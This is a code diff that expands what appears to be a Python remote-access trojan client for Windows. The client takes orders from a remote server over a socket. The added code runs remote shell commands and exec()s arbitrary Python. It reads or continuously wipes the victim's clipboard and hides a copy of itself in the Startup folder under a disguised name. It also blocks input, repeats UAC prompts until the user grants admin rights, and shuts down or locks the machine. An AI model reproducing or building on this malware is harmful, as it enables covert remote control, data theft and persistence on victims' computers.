@@ -2,6 +2,10 @@ import socket
 import subprocess
 import os
 import sys
+import threading
+import win32clipboard
+import win32api
+import ctypes
 from time import sleep
 
 BUFF_SIZE = 64
@@ -9,7 +13,6 @@ ADDRESS = socket.gethostbyname(socket.gethostname())
 PORT = 5050
 FORMAT = "utf-8"
 SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
 
 def main():
     while True:
@@ -25,27 +28,163 @@ def main():
                     sys.exit()
 
                 elif command == "cmd":
-                    shell_command()
+                    cmd()
 
                 elif command == "startup":
-                    pass
+                    startup()
 
                 elif command == "clipboard":
-                    pass
+                    clipboard()
+
+                elif command == "disableclipboard":
+                    if not disable_clipboard_thread.is_alive():
+                        disable_clipboard_thread.start()
+
+                elif command == "activateclipbaord":
+                    disable_clipboard_thread.daemon = False
 
                 elif command == "python":
-                    pass
+                    python()
+
+                elif command == "block":
+                    block()
+
+                elif command == "unblock":
+                    block(active=False)
+
+                elif command == "checkadmin":
+                    check_admin()
+
+                elif command == "uac":
+                    uac()
+
+                elif command == "fuac":
+                    fuac()
+
+                elif command == "shutdown":
+                    shutdown()
+
+                elif command == "lock":
+                    lock()
 
             except socket.error as e:
                 del SERVER
                 break
 
-
-def shell_command():
+# Runs command shell
+def cmd():
+    # TODO
     send(os.getcwd() + ">>")
     command = receive()
     output = subprocess.check_output(command, shell=True)
 
+# Sends clipboard
+def clipboard():
+    win32clipboard.OpenClipboard()
+    data = win32clipboard.GetClipboardData()
+    win32clipboard.CloseClipboard()
+    send(data)
+
+# Constantly deletes clipboard
+def disable_clipboard():
+    while disable_clipboard_thread.daemon:
+        win32clipboard.OpenClipboard()
+        try:
+            while disable_clipboard_thread.daemon:
+                win32clipboard.EmptyClipboard()
+                sleep(1)
+        finally:
+            win32clipboard.CloseClipboard()
+
+# Copy to startup
+def startup():
+    # Path to startup folder
+    path = "C:\\Users\\" + os.getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\process_measurement.exe"
+
+    # Check if path exists
+    if not os.path.exists(path):
+
+        # If not read current file
+        with open(sys.argv[0], "rb")as file:
+            byt = file.read()
+
+        # And copy it to startup path
+        with open(path, "wb")as file:
+            file.write(byt)
+
+        # Hide file
+        win32api.SetFileAttributes(path, 2)
+
+        send(f"File added to following path: {path}")
+    else:
+        send(f"File already established at following path: {path}")
+
+# Python interpreter
+def python():
+    # Permanent loop
+    while True:
+        send("Send exit to go back\nEnter python script>> ")
+
+        # Receive input
+        script = receive()
+
+        # if exit is received quit the shell
+        if script == "exit":
+            send("Quitting...")
+            return
+
+        # Try to run script and catch errors
+        try:
+            exec(script)
+            send("Script executed successful")
+
+        # Send Error
+        except Exception as e:
+            # TODO
+            send(str(e))
+
+# Blocks oder unblocks input (admin only)
+def block(active=True):
+    if active:
+        ctypes.windll.user32.BlockInput(True)
+        send("Block active if admin rights established")
+    else:
+        ctypes.windll.user32.BlockInput(False)
+        send("Block deactivated if admin rights established")
+
+# Checks if program runs as admin
+def check_admin():
+    if ctypes.windll.shell32.IsUserAnAdmin():
+        send("Program runs as admin")
+    else:
+        send("Program runs not as admin")
+
+# Asks for admin privileges and exits if accepted, designed to run an executable
+def uac():
+    if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], "", None, 1) == 42:
+        send("UAC request accepted\nRestarting...")
+        sys.exit()
+
+    else:
+        send("UAC request declined")
+
+# Displays the uac window until accepted
+def fuac():
+    while ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.argv[0], "", None, 1) != 42:
+        pass
+
+    send("UAC request accepted\nRestarting...")
+    sys.exit()
+
+# Shuts down the computer
+def shutdown():
+    send("Shutting down...")
+    os.system("shutdown -s -t 0")
+
+# Locks the screen
+def lock():
+    send("Locking...")
+    ctypes.windll.user32.LockWorkStation()
 
 def connect_to_server():
     while True:
@@ -74,3 +213,7 @@ if __name__ == '__main__':
     while True:
         main()
         del SERVER
+
+
+disable_clipboard_thread = threading.Thread(target=disable_clipboard)
+disable_clipboard_thread.daemon = True
